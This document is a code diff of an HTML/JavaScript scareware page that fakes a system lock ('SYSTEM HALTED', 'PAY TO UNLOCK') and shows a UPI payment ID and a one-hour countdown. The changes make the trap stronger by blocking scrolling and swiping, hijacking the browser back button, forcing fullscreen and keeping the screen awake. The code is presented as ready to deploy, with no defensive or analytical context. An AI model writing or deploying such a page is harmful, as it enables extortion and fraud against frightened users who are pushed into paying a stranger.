@@ -3,47 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Locked</title>
+    <title>System Freeze</title>
     <style>
-        /* Remove all default margins and padding */
-        body, html {
+        /* Force Fullscreen & No Scroll */
+        html, body {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
-            overflow: hidden; /* Prevent scrolling */
+            overflow: hidden; /* Prevents scrolling/swiping */
             background-color: #000;
             font-family: 'Courier New', Courier, monospace;
-            color: white;
+            user-select: none; /* Prevents text selection */
+            -webkit-user-select: none;
         }
 
-        /* The Lock Screen Overlay */
-        #lock-screen {
+        /* The "Frozen" Screen Overlay */
+        #freeze-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle, #1a1a1a 0%, #000000 100%);
+            background: #000;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            text-align: center;
         }
 
-        /* Glitch Effect for Title */
+        /* Glitch Text Effect */
         .glitch {
-            font-size: 2rem;
+            font-size: 2.5rem;
             font-weight: bold;
-            color: #ff3333;
+            color: #ff0000;
             text-transform: uppercase;
-            animation: glitch 1s infinite;
-            margin-bottom: 20px;
+            position: relative;
+            animation: glitch-anim 0.3s infinite;
+            margin-bottom: 10px;
         }
 
-        @keyframes glitch {
+        @keyframes glitch-anim {
             0% { transform: translate(0) }
             20% { transform: translate(-2px, 2px) }
             40% { transform: translate(-2px, -2px) }
@@ -52,42 +53,47 @@
             100% { transform: translate(0) }
         }
 
-        /* UPI ID Box */
-        .upi-box {
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid #ff3333;
+        /* UPI Box Styling */
+        .upi-container {
+            background: rgba(30, 30, 30, 0.9);
+            border: 2px solid #ff0000;
             padding: 20px;
-            border-radius: 10px;
+            border-radius: 15px;
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
             margin: 20px 0;
-            box-shadow: 0 0 15px rgba(255, 51, 51, 0.5);
         }
 
         .upi-label {
-            font-size: 1rem;
             color: #ccc;
+            font-size: 1rem;
+            margin-bottom: 5px;
         }
 
         .upi-id {
-            font-size: 2.5rem;
-            font-weight: bold;
             color: #fff;
-            letter-spacing: 2px;
+            font-size: 2rem;
+            font-weight: bold;
+            letter-spacing: 1px;
         }
 
-        /* Countdown Timer */
-        .timer {
+        /* Timer Styling */
+        .timer-display {
             font-size: 4rem;
-            margin-top: 20px;
             color: #00ffcc;
+            margin-top: 20px;
+            font-weight: bold;
         }
 
-        .status {
-            margin-top: 10px;
-            font-size: 1.2rem;
+        .status-msg {
             color: #888;
+            font-size: 1.2rem;
+            margin-top: 10px;
         }
 
-        /* Click to Start Overlay (Browsers need this for Fullscreen) */
+        /* Start Overlay */
         #start-overlay {
             position: fixed;
             top: 0;
@@ -103,7 +109,7 @@
             cursor: pointer;
         }
 
-        /* Hidden class to remove elements */
+        /* Hidden Class */
         .hidden {
             display: none !important;
         }
@@ -111,38 +117,38 @@
 </head>
 <body>
 
-    <!-- Click anywhere to start the "Virus" -->
+    <!-- Click to Start -->
     <div id="start-overlay">
-        <h1>TAP TO LOCK SYSTEM</h1>
+        <h1>TAP TO FREEZE SYSTEM</h1>
     </div>
 
-    <!-- The Main Lock Screen -->
-    <div id="lock-screen" class="hidden">
+    <!-- The Frozen Screen -->
+    <div id="freeze-screen" class="hidden">
         <div class="glitch">SYSTEM HALTED</div>
         
-        <div class="upi-box">
+        <div class="upi-container">
             <div class="upi-label">PAY TO UNLOCK</div>
             <div class="upi-id">51club@axl</div>
         </div>
 
-        <div class="status">FUNCTIONS DISABLED</div>
-        <div class="timer" id="countdown">60:00</div>
+        <div class="status-msg">FUNCTIONS DISABLED</div>
+        <div class="timer-display" id="countdown">60:00</div>
     </div>
 
     <script>
         // Configuration
         const upiID = "51club@axl";
-        let timeLeft = 60 * 60; // 1 hour in seconds (3600 seconds)
-        
+        let timeLeft = 60 * 60; // 1 hour in seconds (3600)
+
         const startOverlay = document.getElementById('start-overlay');
-        const lockScreen = document.getElementById('lock-screen');
+        const freezeScreen = document.getElementById('freeze-screen');
         const countdownEl = document.getElementById('countdown');
 
         // Function to enter Fullscreen
         function toggleFullScreen() {
             if (!document.fullscreenElement) {
                 document.documentElement.requestFullscreen().catch(err => {
-                    console.log(`Error attempting to enable full-screen mode: ${err.message}`);
+                    console.log(`Error: ${err.message}`);
                 });
             }
         }
@@ -150,40 +156,76 @@
         // Start the "Virus" on click
         startOverlay.addEventListener('click', () => {
             startOverlay.classList.add('hidden');
-            lockScreen.classList.remove('hidden');
+            freezeScreen.classList.remove('hidden');
             
             // Enter Fullscreen
             toggleFullScreen();
 
-            // Prevent going back (simple way by scrolling to top and staying)
-            window.scrollTo(0, 0);
+            // Prevent Swipe/Scroll visually
+            document.body.addEventListener('touchmove', preventDefault, { passive: false });
+            document.body.addEventListener('wheel', preventDefault);
+
+            // Start Timer
+            startTimer();
         });
 
-        // Countdown Timer Logic
-        const timerInterval = setInterval(() => {
-            let minutes = Math.floor(timeLeft / 60);
-            let seconds = timeLeft % 60;
+        // Prevent Default Scroll/Swipe Behavior
+        function preventDefault(e) {
+            e.preventDefault();
+        }
 
-            // Add leading zeros
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-
-            countdownEl.textContent = `${minutes}:${seconds}`;
-
-            if (timeLeft === 0) {
-                clearInterval(timerInterval);
-                document.querySelector('.glitch').textContent = "SYSTEM RESTORED";
-                document.querySelector('.status').textContent = "You may close the browser.";
-                countdownEl.style.color = "#00ff00"; // Green for success
-            } else {
-                timeLeft--;
-            }
-        }, 1000);
-
-        // Optional: Prevent swipe back on some Android browsers
-        window.addEventListener('popstate', () => {
+        // Disable Back Button (Android)
+        window.onpopstate = function(event) {
             history.pushState(null, null, location.href);
-        });
+        };
+        
+        // Initial push to history stack
+        history.pushState(null, null, location.href);
+
+        // Timer Logic
+        function startTimer() {
+            const timerInterval = setInterval(() => {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+
+                // Add leading zeros
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                countdownEl.textContent = `${minutes}:${seconds}`;
+
+                if (timeLeft === 0) {
+                    clearInterval(timerInterval);
+                    document.querySelector('.glitch').textContent = "SYSTEM RESTORED";
+                    document.querySelector('.status-msg').textContent = "Tap to exit.";
+                    countdownEl.style.color = "#00ff00"; // Green
+                    
+                    // Optional: Exit fullscreen after 2 seconds of restored message
+                    setTimeout(() => {
+                        if (document.fullscreenElement) {
+                            document.exitFullscreen();
+                        }
+                    }, 2000);
+                } else {
+                    timeLeft--;
+                }
+            }, 1000);
+        }
+
+        // Keep screen awake (Wake Lock API)
+        async function keepAwake() {
+            try {
+                if ('wakeLock' in navigator) {
+                    await navigator.wakeLock.request('screen');
+                }
+            } catch (err) {
+                console.log(`${err.name}, ${err.message}`);
+            }
+        }
+        
+        // Call wake lock after start
+        setTimeout(keepAwake, 1000);
+
     </script>
 </body>
 </html>
